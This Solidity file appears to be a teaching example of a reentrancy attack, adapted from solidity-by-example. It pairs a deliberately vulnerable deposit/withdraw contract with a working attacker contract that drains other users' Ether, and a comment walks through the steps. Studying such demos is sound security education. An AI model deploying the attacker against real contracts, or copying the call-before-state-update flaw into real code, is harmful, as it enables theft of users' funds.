// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/*//////////////////////////////////////////////////////////////
/////////////////////////  REENTRANCY  /////////////////////////
//////////////////////////////////////////////////////////////*/

// Inspired by: https://solidity-by-example.org/hacks/re-entrancy/

contract ReentrancyVictim {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
}

contract ReentrancyAttacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}

/*
ReentrancyVictim is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy ReentrancyVictim
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy ReentrancyAttacker with address of ReentrancyVictim
4. Call ReentrancyAttacker.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call ReentrancyVictim.withdraw multiple times before
ReentrancyVictim.withdraw finished executing.

Here is how the functions were called
- ReentrancyAttacker.attack
- ReentrancyVictim.deposit
- ReentrancyVictim.withdraw
- Attack fallback (receives 1 Ether)
- ReentrancyVictim.withdraw
- Attack.fallback (receives 1 Ether)
- ReentrancyVictim.withdraw
- Attack fallback (receives 1 Ether)

- The Attack contract now has all the balance
- Attacker can easily withdraw from this contract
*/
